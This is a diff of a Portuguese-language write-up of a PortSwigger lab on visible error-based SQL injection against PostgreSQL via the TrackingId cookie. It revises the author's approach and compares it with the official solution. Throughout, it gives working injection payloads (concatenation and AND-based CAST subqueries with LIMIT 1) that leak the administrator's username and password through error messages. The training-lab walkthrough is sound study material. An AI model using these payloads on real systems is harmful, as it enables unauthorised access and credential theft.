@@ -10,161 +10,130 @@ O banco de dados contém uma tabela chamada `users`, com colunas chamadas `usern
 
 Para resolver o lab, utilize uma injeção SQL baseada em erros visíveis (visible error-based) para extrair a senha do usuário `administrator` e faça login com essa conta.
 
-## O que fiz (Fluxo 1: Minha Investigação)
+## O que fiz (Fluxo 1: Minha Linha de Raciocínio)
 
-Iniciamos os testes interceptando o tráfego no Burp Suite e analisando a requisição que envia o cookie `TrackingId`. Para verificar como o backend lida com entradas maliciosas, adicionamos uma aspa simples `'` ao final do valor do cookie:
+Iniciamos os testes interceptando o tráfego no Burp Suite e analisando a requisição que envia o cookie `TrackingId`. Para verificar como o backend lida com entradas maliciosas, adicionamos uma aspa simples `'` ao final do valor do cookie para quebrar a consulta. 
 
-```http
-Cookie: TrackingId=ogAZZfxtOKUELbuJ'
-```
-
-A aplicação respondeu com uma mensagem de erro detalhada do PostgreSQL revelando a consulta interna completa e indicando que havia uma string literal não fechada (`unclosed string literal`). Isso nos mostrou que a entrada é concatenada diretamente entre aspas na query e que as mensagens de erro do banco são exibidas abertamente na tela.
-
-Para verificar se podíamos controlar o fechamento da consulta, adicionamos caracteres de comentário (`--`) para anular o restante do código original:
+Após confirmar que o banco exibe mensagens detalhadas, tentei buscar diretamente a senha da tabela de usuários utilizando operadores de concatenação de strings (`||`):
 
 ```http
-Cookie: TrackingId=ogAZZfxtOKUELbuJ'--
+Cookie: TrackingId=h9pk8p8U3mU43jqp'||(select password from users)||'
 ```
 
-A requisição retornou `HTTP 200 OK` sem mensagens de erro, confirmando que a sintaxe foi corrigida com sucesso.
+O banco de dados recusou a execução e retornou o seguinte erro:
+`ERROR: more than one row returned by a subquery used as an expression`
 
-### Validando a extração via erro com `CAST` e versão do banco
+**O que aprendi aqui:** O banco reclamou explicitamente que a tabela possui mais de uma linha. O SQL proíbe injetar uma lista de resultados diretamente dentro de uma expressão de concatenação escalar.
 
-Para cravar que o banco é vulnerável à exfiltração de dados via erro, testamos injetar uma tentativa de conversão da função `version()` para o tipo inteiro (`int`) usando concatenação:
+Para corrigir essa restrição de linhas, apliquei o `LIMIT 1` para forçar o retorno de apenas um único registro:
 
 ```http
-Cookie: TrackingId='||(select cast(version() as int))||'
+Cookie: TrackingId=h9pk8p8U3mU43jqp'||(select password from users limit 1)||'
 ```
 
-Como o resultado de `version()` é uma string descritiva e não um número, o PostgreSQL quebrou a execução e imprimiu a versão exata do banco dentro do próprio erro:
+A query rodou perfeitamente e retornou `HTTP 200 OK`. No entanto, como os dados não são exibidos no layout da página, precisamos forçar um erro de conversão de tipo (`CAST`) para fazer o banco cuspir a resposta na tela. 
+
+Tentei converter o resultado para o tipo inteiro (`int`):
+
+```http
+Cookie: TrackingId=h9pk8p8U3mU43jqp'||(select cast(password as int) from users limit 1)||'
+```
+
+O servidor quebrou, mas apresentou uma mensagem estranha de aspa não finalizada:
+`Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'h9pk8p8U3mU43jqp'||(select cast(password as int) from users '. Expected  char`
+
+### Investigando o Truncamento (A Pegadinha do Lab)
+
+Repare que a nossa resposta não foi inteira. O código foi cortado exatamente em `from users `. Para provar que o backend estava limitando fisicamente o tamanho do nosso input, fiz um teste de stress preenchendo o cookie com um comentário de bloco numerado:
+
+```http
+TrackingId=h9pk8p8U3mU43jqp'||/*1*2*3*4*5*6*7*8*9*10*11*12*13*14*15*16*17*18*19*20*21*22*23*24*25*26*27*28*29*30******
+```
+
+O banco de dados retornou o seguinte erro:
+`Unterminated block comment started at position 54 in SQL SELECT * FROM tracking WHERE id = 'h9pk8p8U3mU43jqp'||/*1*2*3*4*5*6*7*8*9*10*11*12*13*14*15*16*'. Expected */ sequence`
+
+**Descoberta crucial:** O backend limpa o buffer passando uma "tesoura" na query final quando ela atinge o limite máximo de caracteres. Qualquer caractere que passe desse limite é descartado, destruindo a sintaxe do SQL antes do comando ser executado.
+
+### O Acerto Definitivo (Otimizando Espaço)
+
+Para fazer o payload caber no espaço útil do buffer, a solução foi remover completamente o ID original do cookie (`h9pk8p8U3mU43jqp`) para economizar preciosos caracteres. 
+
+A partir disso, montei variações curtas e extremamente eficientes que funcionaram perfeitamente:
+
+* **Buscando o Usuário (Sintaxe Tradicional):**
+  ```http
+  TrackingId='||(select cast(username as int) from users limit 1)||'
+  ```
+* **Buscando a Senha (Sintaxe Tradicional):**
+  ```http
+  TrackingId='||(select cast(password as int) from users limit 1)||'
+  ```
+
+Também é possível encurtar ainda mais o payload utilizando o operador nativo de conversão do PostgreSQL (`::int`), dispensando a escrita da palavra `CAST`:
+
+* **Buscando o Usuário (Sintaxe Curta do Postgres):**
+  ```http
+  TrackingId='||(select username::int from users limit 1)||'
+  ```
+* **Buscando a Senha (Sintaxe Curta do Postgres):**
+  ```http
+  TrackingId='||(select password::int from users limit 1)||'
+  ```
+
+O banco tentou converter as strings das credenciais em número inteiro, falhou violentamente por incompatibilidade de tipo e despejou os dados que precisávamos direto no log de erro:
 
 ```text
-ERROR: invalid input syntax for type integer: "PostgreSQL 12.22..."
-```
-
-### Tentativa de Extração com Concatenação Direta (`||`)
-
-Aproveitando a lógica de concatenação que funcionou com a versão do banco, tentei buscar diretamente a senha da tabela de usuários:
-
-```http
-Cookie: TrackingId=ogAZZfxtOKUELbuJ'||(SELECT CAST(password AS int) FROM users WHERE username = 'administrator')||'
-```
-
-A aplicação quebrou retornando o erro:
-`Unterminated string literal started at position 67...`
-
-**Onde travei (Pegadinha do Lab - O Truncamento):**  
-Ao inspecionar minuciosamente a mensagem de erro e fazer um teste de stress preenchendo o campo do cookie com um comentário de bloco cheio de asteriscos (`/* ***** */`), o banco retornou `Unterminated block comment`. 
-
-Isso expôs a anatomia do backend: a query resultante exibida no log tinha exatamente **95 caracteres**. Ou seja, o backend impõe um **limite de tamanho rígido** e passa a "tesoura" (truncamento físico) na string antes de enviá-la ao banco de dados. Como meu payload original era muito longo, o corte destruiu o fechamento das aspas e quebrou a sintaxe.
-
-Para tentar liberar espaço útil dentro do limite do buffer de 95 caracteres, deletei o ID original do cookie (`ogAZZfxtOKUELbuJ`) e reduzi os caracteres, porém tentei enviar uma estrutura com o `SELECT` solto:
-
-```http
-Cookie: TrackingId='' select cast('' as int)'
-```
-
-**Por que falhou?**  
-O banco retornou erro de sintaxe. No SQL, não é permitido colocar uma instrução `SELECT` solta grudada logo após uma string, sem um operador lógico interligando-as (como `AND`/`OR`) ou um operador de concatenação (`||`). Além disso, as aspas duplicadas criadas no final geraram um conflito gramatical no interpretador.
-
-### O Acerto Contextual (A Resolução pelo Meu Método)
-
-Ajustando a sintaxe para manter a concatenação limpa e o payload o mais curto possível para caber no buffer, removi filtros e enviei exatamente este comando:
-
-```http
-Cookie: TrackingId='||(SELECT CAST(password AS int) FROM users)||'
-```
-
-O PostgreSQL processou o comando completamente sem sofrer truncamento, falhou na conversão do tipo do dado e expôs a senha com sucesso na tela:
-
-```text
+ERROR: invalid input syntax for type integer: "administrator"
 ERROR: invalid input syntax for type integer: "107127y3iqlwvdq557i7"
 ```
 
-O laboratório foi resolvido e consegui logar. No entanto, uma análise pós-exploração realista revelou que esse payload **falharia em 99% dos cenários reais**.
+Copiamos a senha e logamos com sucesso.
 
 ---
 
-## A Ressalva do Mundo Real: Por que o meu fluxo é frágil?
+## Fluxo 2: A Abordagem Alternativa (Como o PortSwigger Resolve)
 
-Minha query simplificada `SELECT CAST(password AS int) FROM users` funcionou **única e exclusivamente porque a tabela `users` deste laboratório continha apenas 1 registro**.
+A resolução oficial proposta pela plataforma segue um caminho diferente. Em vez de usar operadores de concatenação (`||`), eles utilizam operadores lógicos booleanos (`AND`) combinados com um operador de comparação matemática (`1=`) para estruturar a query.
 
-Em um ambiente de produção real, tabelas possuem múltiplos usuários cadastrados. Se houvesse mais de uma linha na tabela, o PostgreSQL executaria a subquery de dentro para fora. Antes mesmo de avaliar o erro do `CAST`, o banco veria que uma subquery que retorna uma lista (múltiplas linhas) está tentando ser espremida e concatenada dentro de uma linha única. 
+### 1. Forçando a Tipagem Booleana
 
-O banco abortaria a execução imediatamente e retornaria o erro genérico:
-> `ERROR: more than one row returned by a subquery used as an expression`
-
-Esse erro genérico bloquearia o processamento, escondendo o dado e estragando a extração da credencial. Além disso, se tentássemos expandir meu payload com cláusulas como `WHERE username='administrator'` ou `LIMIT 1`, a query voltaria a estourar o limite de 95 caracteres do buffer, sofrendo o truncamento físico do backend novamente.
-
----
-
-## Fluxo 2: A Solução Oficial e Definitiva (Como o Lab Resolve)
-
-Para contornar tanto o problema de **múltiplas linhas** quanto o **limite estrito de tamanho do buffer**, a solução estrutural correta exige o uso de operadores lógicos booleanos combinados com paginação rígida, conforme a metodologia oficial do laboratório [0.15].
-
-### 1. Ajustando a Tipagem Booleana com `AND`
-
-Ao tentar usar o operador `AND` com uma subquery simples:
-
+O laboratório injeta o `AND` junto com o `CAST` para disparar o erro:
 ```http
 Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
 ```
-
-A aplicação respondeu com:  
+Como o PostgreSQL é fortemente tipado, o operador `AND` exige um retorno booleano (`true`/`false`). Como o `CAST` retorna um número inteiro, o banco nega a execução:  
 `ERROR: argument of AND must be type boolean, not type integer`
 
-Isso ocorre porque o **PostgreSQL é fortemente tipado**. O operador `AND` exige uma condição booleana (`true` ou `false`). Como o `CAST(... AS int)` retorna um número inteiro, o banco recusa a operação. 
-
-Para resolver essa exigência, transformamos a expressão em uma comparação lógica adicionando `1=`, o que cria uma operação booleana válida:
-
+Para corrigir a exigência gramatical do banco, eles adicionam uma comparação lógica (`1=`), tornando a expressão válida:
 ```http
 Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
 ```
 
-A requisição foi aceita com sucesso (`200 OK`).
+### 2. Lidando com o Truncamento e Múltiplas Linhas
 
-### 2. Contornando o Truncamento e Múltiplas Linhas
-
-Ao expandir a subquery para buscar na tabela `users`:
-
+Ao tentar buscar dados reais da tabela de usuários usando essa estrutura, o payload estoura o limite de tamanho por causa do ID original do cookie:
 ```http
 Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
 ```
+A query sofre o truncamento físico e remove o caractere de comentário `--` do final, quebrando o fechamento das aspas. 
 
-O erro de aspas não finalizadas voltou a acontecer por conta do limite de caracteres do buffer. Seguindo o procedimento correto para liberar espaço, o ID do cookie original foi completamente removido [0.15]:
-
+Para limpar o buffer, eles removem o ID do cookie original:
 ```http
 Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
 ```
-
-Com isso, a query coube inteira no buffer, mas disparou o erro de subquery retornando mais de uma linha (`more than one row returned...`) [0.15]. 
-
-Para resolver este problema de forma definitiva e garantir o retorno de apenas uma única linha escalar por vez, aplicamos a cláusula `LIMIT 1` [0.15]:
+Ao enviar, o tamanho fica correto, mas o banco devolve o erro de múltiplas linhas (`more than one row returned...`). Para mitigar isso, eles aplicam a restrição de paginação usando o `LIMIT 1`:
 
 ```http
 Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
 ```
-
-O PostgreSQL tentou converter o texto do primeiro registro para inteiro, falhou e vazou o usuário no erro [0.15]:
-```text
-ERROR: invalid input syntax for type integer: "administrator"
-```
-
-### 3. Extraindo a Senha com a Sintaxe Correta
-
-Sabendo que o primeiro registro isolado pelo `LIMIT 1` era de fato o `administrator`, alteramos o campo `username` para `password` [0.15]:
-
+O erro exibe o usuário `administrator`. Na sequência, alteram o campo para buscar a credencial final:
 ```http
 Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 ```
 
-O banco falhou ao tentar transformar a string alfanumérica da senha em um número inteiro e expôs a credencial de forma limpa na mensagem de erro [0.15]:
-
-```text
-ERROR: invalid input syntax for type integer: "107127y3iqlwvdq557i7"
-```
-
-Utilizamos a senha coletada para efetuar o login e concluir formalmente o desafio.
+### Conclusão Comparativa
+Ambas as abordagens resolvem os dois grandes problemas do cenário: o limite de tamanho (truncamento) e a restrição de linhas do SQL. No entanto, o método usando concatenação direta (`||`) provou-se ligeiramente mais curto e mais limpa, economizando a necessidade de criar condicionais lógicas artificiais como `1=`.
 
 ---
 
